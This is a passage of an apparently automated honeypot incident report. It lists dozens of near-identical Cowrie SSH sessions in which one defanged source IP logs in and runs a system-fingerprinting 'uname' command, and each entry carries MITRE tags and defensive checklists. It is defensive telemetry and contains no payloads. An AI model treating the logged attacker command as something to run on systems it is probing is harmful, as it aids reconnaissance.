| `2026-08-11 08:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b3b2a55e908

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:38` | `cowrie.session.connect` |
| `2026-08-11 08:51:38` | `cowrie.client.version` |
| `2026-08-11 08:51:38` | `cowrie.client.kex` |
| `2026-08-11 08:51:39` | `cowrie.login.success` |
| `2026-08-11 08:51:39` | `cowrie.session.params` |
| `2026-08-11 08:51:39` | `cowrie.command.input` |
| `2026-08-11 08:51:40` | `cowrie.log.closed` |
| `2026-08-11 08:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5308bc9b90a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:43` | `cowrie.session.connect` |
| `2026-08-11 08:51:43` | `cowrie.client.version` |
| `2026-08-11 08:51:43` | `cowrie.client.kex` |
| `2026-08-11 08:51:44` | `cowrie.login.success` |
| `2026-08-11 08:51:44` | `cowrie.session.params` |
| `2026-08-11 08:51:44` | `cowrie.command.input` |
| `2026-08-11 08:51:45` | `cowrie.log.closed` |
| `2026-08-11 08:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e915edea8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:48` | `cowrie.session.connect` |
| `2026-08-11 08:51:48` | `cowrie.client.version` |
| `2026-08-11 08:51:48` | `cowrie.client.kex` |
| `2026-08-11 08:51:48` | `cowrie.login.success` |
| `2026-08-11 08:51:49` | `cowrie.session.params` |
| `2026-08-11 08:51:49` | `cowrie.command.input` |
| `2026-08-11 08:51:49` | `cowrie.log.closed` |
| `2026-08-11 08:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d952ce31c56b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:53` | `cowrie.session.connect` |
| `2026-08-11 08:51:53` | `cowrie.client.version` |
| `2026-08-11 08:51:53` | `cowrie.client.kex` |
| `2026-08-11 08:51:54` | `cowrie.login.success` |
| `2026-08-11 08:51:55` | `cowrie.session.params` |
| `2026-08-11 08:51:55` | `cowrie.command.input` |
| `2026-08-11 08:51:55` | `cowrie.log.closed` |
| `2026-08-11 08:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51392199f688

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:51 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:51:58` | `cowrie.session.connect` |
| `2026-08-11 08:51:58` | `cowrie.client.version` |
| `2026-08-11 08:51:59` | `cowrie.client.kex` |
| `2026-08-11 08:51:59` | `cowrie.login.success` |
| `2026-08-11 08:52:00` | `cowrie.session.params` |
| `2026-08-11 08:52:00` | `cowrie.command.input` |
| `2026-08-11 08:52:00` | `cowrie.log.closed` |
| `2026-08-11 08:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca3db7a96434

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:04` | `cowrie.session.connect` |
| `2026-08-11 08:52:04` | `cowrie.client.version` |
| `2026-08-11 08:52:04` | `cowrie.client.kex` |
| `2026-08-11 08:52:04` | `cowrie.login.success` |
| `2026-08-11 08:52:05` | `cowrie.session.params` |
| `2026-08-11 08:52:05` | `cowrie.command.input` |
| `2026-08-11 08:52:06` | `cowrie.log.closed` |
| `2026-08-11 08:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32206789285

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:09` | `cowrie.session.connect` |
| `2026-08-11 08:52:09` | `cowrie.client.version` |
| `2026-08-11 08:52:09` | `cowrie.client.kex` |
| `2026-08-11 08:52:09` | `cowrie.login.success` |
| `2026-08-11 08:52:10` | `cowrie.session.params` |
| `2026-08-11 08:52:10` | `cowrie.command.input` |
| `2026-08-11 08:52:10` | `cowrie.log.closed` |
| `2026-08-11 08:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11546166d960

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:14` | `cowrie.session.connect` |
| `2026-08-11 08:52:14` | `cowrie.client.version` |
| `2026-08-11 08:52:14` | `cowrie.client.kex` |
| `2026-08-11 08:52:14` | `cowrie.login.success` |
| `2026-08-11 08:52:15` | `cowrie.session.params` |
| `2026-08-11 08:52:15` | `cowrie.command.input` |
| `2026-08-11 08:52:15` | `cowrie.log.closed` |
| `2026-08-11 08:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc8b8609ef54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:19` | `cowrie.session.connect` |
| `2026-08-11 08:52:19` | `cowrie.client.version` |
| `2026-08-11 08:52:20` | `cowrie.client.kex` |
| `2026-08-11 08:52:20` | `cowrie.login.success` |
| `2026-08-11 08:52:22` | `cowrie.session.params` |
| `2026-08-11 08:52:22` | `cowrie.command.input` |
| `2026-08-11 08:52:22` | `cowrie.log.closed` |
| `2026-08-11 08:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc44399ba77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:25` | `cowrie.session.connect` |
| `2026-08-11 08:52:25` | `cowrie.client.version` |
| `2026-08-11 08:52:25` | `cowrie.client.kex` |
| `2026-08-11 08:52:25` | `cowrie.login.success` |
| `2026-08-11 08:52:26` | `cowrie.session.params` |
| `2026-08-11 08:52:26` | `cowrie.command.input` |
| `2026-08-11 08:52:26` | `cowrie.log.closed` |
| `2026-08-11 08:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f449c6859f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:30` | `cowrie.session.connect` |
| `2026-08-11 08:52:30` | `cowrie.client.version` |
| `2026-08-11 08:52:30` | `cowrie.client.kex` |
| `2026-08-11 08:52:30` | `cowrie.login.success` |
| `2026-08-11 08:52:31` | `cowrie.session.params` |
| `2026-08-11 08:52:31` | `cowrie.command.input` |
| `2026-08-11 08:52:31` | `cowrie.log.closed` |
| `2026-08-11 08:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eccff8a4cb26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:35` | `cowrie.session.connect` |
| `2026-08-11 08:52:35` | `cowrie.client.version` |
| `2026-08-11 08:52:35` | `cowrie.client.kex` |
| `2026-08-11 08:52:36` | `cowrie.login.success` |
| `2026-08-11 08:52:36` | `cowrie.session.params` |
| `2026-08-11 08:52:36` | `cowrie.command.input` |
| `2026-08-11 08:52:37` | `cowrie.log.closed` |
| `2026-08-11 08:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e838ca1dfd0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:40` | `cowrie.session.connect` |
| `2026-08-11 08:52:40` | `cowrie.client.version` |
| `2026-08-11 08:52:40` | `cowrie.client.kex` |
| `2026-08-11 08:52:41` | `cowrie.login.success` |
| `2026-08-11 08:52:41` | `cowrie.session.params` |
| `2026-08-11 08:52:41` | `cowrie.command.input` |
| `2026-08-11 08:52:42` | `cowrie.log.closed` |
| `2026-08-11 08:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6144512b6e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:45` | `cowrie.session.connect` |
| `2026-08-11 08:52:45` | `cowrie.client.version` |
| `2026-08-11 08:52:45` | `cowrie.client.kex` |
| `2026-08-11 08:52:46` | `cowrie.login.success` |
| `2026-08-11 08:52:47` | `cowrie.session.params` |
| `2026-08-11 08:52:47` | `cowrie.command.input` |
| `2026-08-11 08:52:47` | `cowrie.log.closed` |
| `2026-08-11 08:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cece9383578e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:50` | `cowrie.session.connect` |
| `2026-08-11 08:52:50` | `cowrie.client.version` |
| `2026-08-11 08:52:50` | `cowrie.client.kex` |
| `2026-08-11 08:52:51` | `cowrie.login.success` |
| `2026-08-11 08:52:52` | `cowrie.session.params` |
| `2026-08-11 08:52:52` | `cowrie.command.input` |
| `2026-08-11 08:52:52` | `cowrie.log.closed` |
| `2026-08-11 08:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4dd884bb34

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:52 |
| **Last Seen** | 2026-08-11 08:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:52:55` | `cowrie.session.connect` |
| `2026-08-11 08:52:55` | `cowrie.client.version` |
| `2026-08-11 08:52:56` | `cowrie.client.kex` |
| `2026-08-11 08:52:56` | `cowrie.login.success` |
| `2026-08-11 08:52:57` | `cowrie.session.params` |
| `2026-08-11 08:52:57` | `cowrie.command.input` |
| `2026-08-11 08:52:57` | `cowrie.log.closed` |
| `2026-08-11 08:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12ff774434d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:01` | `cowrie.session.connect` |
| `2026-08-11 08:53:01` | `cowrie.client.version` |
| `2026-08-11 08:53:01` | `cowrie.client.kex` |
| `2026-08-11 08:53:01` | `cowrie.login.success` |
| `2026-08-11 08:53:02` | `cowrie.session.params` |
| `2026-08-11 08:53:02` | `cowrie.command.input` |
| `2026-08-11 08:53:02` | `cowrie.log.closed` |
| `2026-08-11 08:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20f1c9b7c8c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:06` | `cowrie.session.connect` |
| `2026-08-11 08:53:06` | `cowrie.client.version` |
| `2026-08-11 08:53:06` | `cowrie.client.kex` |
| `2026-08-11 08:53:07` | `cowrie.login.success` |
| `2026-08-11 08:53:07` | `cowrie.session.params` |
| `2026-08-11 08:53:07` | `cowrie.command.input` |
| `2026-08-11 08:53:07` | `cowrie.log.closed` |
| `2026-08-11 08:53:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8827771a48cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:11` | `cowrie.session.connect` |
| `2026-08-11 08:53:11` | `cowrie.client.version` |
| `2026-08-11 08:53:11` | `cowrie.client.kex` |
| `2026-08-11 08:53:12` | `cowrie.login.success` |
| `2026-08-11 08:53:13` | `cowrie.session.params` |
| `2026-08-11 08:53:13` | `cowrie.command.input` |
| `2026-08-11 08:53:13` | `cowrie.log.closed` |
| `2026-08-11 08:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a4c1ace642

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:17` | `cowrie.session.connect` |
| `2026-08-11 08:53:17` | `cowrie.client.version` |
| `2026-08-11 08:53:17` | `cowrie.client.kex` |
| `2026-08-11 08:53:18` | `cowrie.login.success` |
| `2026-08-11 08:53:18` | `cowrie.session.params` |
| `2026-08-11 08:53:18` | `cowrie.command.input` |
| `2026-08-11 08:53:19` | `cowrie.log.closed` |
| `2026-08-11 08:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb780a9d3c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:22` | `cowrie.session.connect` |
| `2026-08-11 08:53:22` | `cowrie.client.version` |
| `2026-08-11 08:53:22` | `cowrie.client.kex` |
| `2026-08-11 08:53:23` | `cowrie.login.success` |
| `2026-08-11 08:53:23` | `cowrie.session.params` |
| `2026-08-11 08:53:23` | `cowrie.command.input` |
| `2026-08-11 08:53:23` | `cowrie.log.closed` |
| `2026-08-11 08:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4658c9880dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:27` | `cowrie.session.connect` |
| `2026-08-11 08:53:27` | `cowrie.client.version` |
| `2026-08-11 08:53:28` | `cowrie.client.kex` |
| `2026-08-11 08:53:28` | `cowrie.login.success` |
| `2026-08-11 08:53:29` | `cowrie.session.params` |
| `2026-08-11 08:53:29` | `cowrie.command.input` |
| `2026-08-11 08:53:29` | `cowrie.log.closed` |
| `2026-08-11 08:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e46f9fd6028

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:33` | `cowrie.session.connect` |
| `2026-08-11 08:53:33` | `cowrie.client.version` |
| `2026-08-11 08:53:33` | `cowrie.client.kex` |
| `2026-08-11 08:53:33` | `cowrie.login.success` |
| `2026-08-11 08:53:34` | `cowrie.session.params` |
| `2026-08-11 08:53:34` | `cowrie.command.input` |
| `2026-08-11 08:53:34` | `cowrie.log.closed` |
| `2026-08-11 08:53:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32ab58a70e9d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:38` | `cowrie.session.connect` |
| `2026-08-11 08:53:38` | `cowrie.client.version` |
| `2026-08-11 08:53:38` | `cowrie.client.kex` |
| `2026-08-11 08:53:39` | `cowrie.login.success` |
| `2026-08-11 08:53:39` | `cowrie.session.params` |
| `2026-08-11 08:53:39` | `cowrie.command.input` |
| `2026-08-11 08:53:39` | `cowrie.log.closed` |
| `2026-08-11 08:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c2fb33160f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:53:43` | `cowrie.session.connect` |
| `2026-08-11 08:53:43` | `cowrie.client.version` |
| `2026-08-11 08:53:43` | `cowrie.client.kex` |
| `2026-08-11 08:53:44` | `cowrie.login.success` |
| `2026-08-11 08:53:45` | `cowrie.session.params` |
| `2026-08-11 08:53:45` | `cowrie.command.input` |
| `2026-08-11 08:53:45` | `cowrie.log.closed` |
| `2026-08-11 08:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]140` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cedd71a9100

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]140` |
| **First Seen** | 2026-08-11 08:53 |
| **Last Seen** | 2026-08-11 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
